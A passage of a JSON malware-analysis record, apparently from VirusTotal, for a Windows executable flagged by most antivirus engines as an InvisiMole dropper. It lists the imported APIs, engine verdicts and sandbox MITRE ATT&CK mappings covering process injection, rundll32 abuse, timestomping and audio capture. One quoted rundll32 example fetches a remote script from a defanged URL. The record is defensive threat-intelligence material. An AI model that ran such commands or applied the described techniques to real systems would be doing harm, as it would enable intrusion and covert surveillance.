              "SetHandleInformation",
              "SetWaitableTimer",
              "Sleep",
              "SystemTimeToFileTime",
              "TerminateProcess",
              "UnmapViewOfFile",
              "VirtualAlloc",
              "VirtualAllocEx",
              "VirtualFree",
              "VirtualFreeEx",
              "WaitForMultipleObjects",
              "WaitForSingleObject",
              "WideCharToMultiByte",
              "WriteFile",
              "WriteProcessMemory"
            ]
          },
          {
            "library_name": "OLEAUT32.dll",
            "imported_functions": [
              "VariantTimeToSystemTime"
            ]
          },
          {
            "library_name": "NETAPI32.dll",
            "imported_functions": [
              "NetApiBufferFree",
              "NetServerEnum",
              "NetShareEnum"
            ]
          },
          {
            "library_name": "SHELL32.dll",
            "imported_functions": [
              "CommandLineToArgvW",
              "ShellExecuteW"
            ]
          },
          {
            "library_name": "ole32.dll",
            "imported_functions": [
              "CoCreateInstance",
              "CoGetObject",
              "CoInitializeEx",
              "CoTaskMemFree",
              "FreePropVariantArray",
              "PropVariantClear"
            ]
          },
          {
            "library_name": "SHLWAPI.dll",
            "imported_functions": [
              "PathCombineW",
              "PathFileExistsW",
              "PathFindFileNameW",
              "PathGetDriveNumberW",
              "PathIsDirectoryW",
              "PathMatchSpecW",
              "PathStripPathW",
              "SHCopyKeyW",
              "SHDeleteKeyW",
              "StrCmpW",
              "StrStrW",
              "StrToIntW"
            ]
          },
          {
            "library_name": "USER32.dll",
            "imported_functions": [
              "CharLowerBuffW",
              "CharLowerW",
              "CreateWindowExW",
              "DefWindowProcW",
              "DestroyWindow",
              "DispatchMessageW",
              "GetForegroundWindow",
              "GetKeyboardLayout",
              "GetKeyboardState",
              "GetMessageW",
              "GetRawInputData",
              "GetWindowThreadProcessId",
              "MapVirtualKeyW",
              "PostQuitMessage",
              "RegisterClassExW",
              "RegisterDeviceNotificationW",
              "RegisterRawInputDevices",
              "ReleaseDC",
              "SendMessageW",
              "ToUnicodeEx",
              "TranslateMessage",
              "UnregisterClassW",
              "UnregisterDeviceNotification",
              "wsprintfA",
              "wsprintfW"
            ]
          }
        ],
        "entry_point": 96096
      },
      "magic": "PE32+ executable (GUI) x86-64, for MS Windows",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 4,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 58,
        "undetected": 14
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "malicious",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": "W64.AIDetectMalware",
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.Win32.Demp.b!c",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.121",
          "result": "malicious (high confidence)",
          "method": "blacklist",
          "engine_update": "20231208"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Gen:Variant.Fugrafa.6978",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Generic.mg.fa2edd8a24266f9e",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "Trojan.InvisiMole.S14247327",
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "BehavesLike.Win64.Dropper.ch",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Trojan.Agent.InvisiMole",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Cylance": {
          "category": "malicious",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": "unsafe",
          "method": "blacklist",
          "engine_update": "20231108"
        },
        "Zillya": {
          "category": "malicious",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5024",
          "result": "Dropper.Demp.Win32.2620",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Dropper.Win32.Demp.V4pr",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.132.50585",
          "result": "Trojan ( 00557d731 )",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Alibaba": {
          "category": "malicious",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": "TrojanDropper:Win32/InvisiMole.eea27b74",
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "12.132.50585",
          "result": "Trojan ( 00557d731 )",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "CrowdStrike": {
          "category": "malicious",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": "win/malicious_confidence_100% (W)",
          "method": "blacklist",
          "engine_update": "20231026"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231127"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.608",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "ML.Attribute.HighConfidence",
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "tehtris": {
          "category": "undetected",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28490",
          "result": "a variant of Win64/InvisiMole.F",
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": "Malicious (score: 100)",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "APEX": {
          "category": "undetected",
          "engine_name": "APEX",
          "engine_version": "6.483",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Paloalto": {
          "category": "undetected",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "Trojan-Dropper.Win32.Demp.awqe",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Gen:Variant.Fugrafa.6978",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": "Trojan.Win64.Demp.fzvwqx",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "Win32:Agent-BCKT [Trj]",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Malware.Win32.Gencirc.10bde698",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "TACHYON": {
          "category": "malicious",
          "engine_name": "TACHYON",
          "engine_version": "2023-12-31.02",
          "result": "Trojan-Dropper/W64.Demp.190464",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Mal/Generic-S",
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": "Trojan.TR/Drop.Demp.otike",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "Trojan.DownLoader30.21609",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Gen:Variant.Fugrafa.6978",
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "Trojan.Win64.INVISIMOLE.B",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Trapmine": {
          "category": "malicious",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.97",
          "result": "suspicious.low.ml.score",
          "method": "blacklist",
          "engine_update": "20231106"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Gen:Variant.Fugrafa.6978 (B)",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "SentinelOne": {
          "category": "undetected",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231230-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "Jiangmin": {
          "category": "malicious",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": "TrojanDropper.Demp.blo",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Webroot": {
          "category": "malicious",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": "W32.Trojan.Gen",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "W64/Agent.NCBY",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "TR/Drop.Demp.otike",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan[APT]/Win64.InvisiMole",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Kingsoft": {
          "category": "malicious",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": "Win32.Troj.Unknown.a",
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": "Trojan:Win32/Ymacco.AAC5",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.153.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "36304",
          "result": "Malware@#2ii0pmae0yirb",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.Fugrafa.D1B42",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "ViRobot": {
          "category": "malicious",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": "Trojan.Win64.S.Agent.190464",
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "Trojan-Dropper.Win32.Demp.awqe",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.37071B:27.34394",
          "result": "Gen:Variant.Fugrafa.6978",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1704000628",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": "Trojan/Win.Generic.R540970",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "RDN/Generic Dropper",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "MAX": {
          "category": "undetected",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "VBA32": {
          "category": "malicious",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": "TrojanDropper.Demp",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Malwarebytes": {
          "category": "malicious",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": "Malware.AI.2335737535",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Panda": {
          "category": "malicious",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": "Trj/CI.A",
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "Trojan.Win64.INVISIMOLE.B",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Dropper.Demp!8.134B (CLOUD)",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Yandex": {
          "category": "malicious",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": "Trojan.InvisiMole!n7QpdRnntSs",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan.Win64.Invisimole",
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.90297171.susgen",
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "W32/Demp.AWQE!tr",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "Win32:Agent-BCKT [Trj]",
          "method": "blacklist",
          "engine_update": "20231231"
        },
        "Cybereason": {
          "category": "malicious",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": "malicious.b1b3dc",
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "DeepInstinct": {
          "category": "malicious",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": "MALICIOUS",
          "method": "blacklist",
          "engine_update": "20231224"
        }
      },
      "reputation": 1
    },
    "type": "file",
    "id": "c5119b8a75d4965e51e7424964bf92f2708b099a4e6049b13f8aaddabfb6860e",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/c5119b8a75d4965e51e7424964bf92f2708b099a4e6049b13f8aaddabfb6860e"
    }
  },
  "mitre": {
    "data": {
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Queries a list of all running processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  },
                  {
                    "severity": "INFO",
                    "description": "Queries the volume information (name, serial number etc) of a device"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Creates a thread in another existing process (thread injection)"
                  },
                  {
                    "severity": "HIGH",
                    "description": "System process connects to network (likely due to code injection)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Injects a PE file into a foreign processes"
                  },
                  {
                    "severity": "LOW",
                    "description": "Writes to foreign memory regions"
                  },
                  {
                    "severity": "INFO",
                    "description": "Spawns processes"
                  },
                  {
                    "severity": "LOW",
                    "description": "Allocates memory in foreign processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading. Masquerading may also include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates files inside the user directory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1036/",
                "id": "T1036",
                "name": "Masquerading"
              },
              {
                "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}).\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. \nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"  This behavior has been seen used by malware such as Poweliks. \nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1).\nAdditionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Runs a DLL by calling functions"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1218/011/",
                "id": "T1218.011",
                "name": "Rundll32"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Creates a thread in another existing process (thread injection)"
                  },
                  {
                    "severity": "HIGH",
                    "description": "System process connects to network (likely due to code injection)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Injects a PE file into a foreign processes"
                  },
                  {
                    "severity": "LOW",
                    "description": "Writes to foreign memory regions"
                  },
                  {
                    "severity": "INFO",
                    "description": "Spawns processes"
                  },
                  {
                    "severity": "LOW",
                    "description": "Allocates memory in foreign processes"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      },
      "DAS-Security Orcas": {
        "tactics": [
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "traverse process"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1518/",
                "id": "T1518",
                "name": "Software Discovery"
              },
              {
                "description": "An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. \nSystem time information may be gathered in a number of ways, such as with Net on Windows by performing net time \\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz.\nOn network devices, Network Device CLI commands such as show clock detail can be used to see the current time configuration.\nThis information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job, or to discover locality information based on time zone to assist in victim targeting (i.e. System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.",
                "signatures": [
                  {
                    "severity": "MEDIUM",
                    "description": "get systime by api"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1124/",
                "id": "T1124",
                "name": "System Time Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "snapshot process"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\nTimestomping may be used along with file name Masquerading to hide malware and tools.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "change timestomp"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1070/006/",
                "id": "T1070.006",
                "name": "Timestomp"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          }
        ]
      },
      "CAPA": {
        "tactics": [
          {
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "capture microphone audio"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1123/",
                "id": "T1123",
                "name": "Audio Capture"
